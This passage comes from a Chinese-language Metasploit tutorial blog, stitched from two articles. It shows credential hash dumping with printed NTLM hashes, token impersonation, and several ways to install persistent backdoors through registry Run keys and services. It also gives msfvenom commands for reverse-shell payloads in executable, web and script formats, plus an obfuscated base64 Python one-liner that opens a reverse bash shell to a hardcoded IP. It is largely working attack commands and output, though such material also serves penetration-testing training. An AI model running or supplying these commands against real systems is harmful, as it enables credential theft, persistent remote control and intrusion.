class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure>

<h3 id="4-7-假冒令牌-1"><a href="#4-7-假冒令牌-1" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

<h3 id="4-8-植入后门-1"><a href="#4-8-植入后门-1" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>

能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>

三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>

此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>

4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">萌新科普 手把手教你如何用MSF进行后渗透测试 - 安全客，安全资讯平台</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>

启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure>

<h2 id="2-msf基本命令-2"><a href="#2-msf基本命令-2" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<h2 id="3-msfvenom生成payload-2"><a href="#3-msfvenom生成payload-2" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>

4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

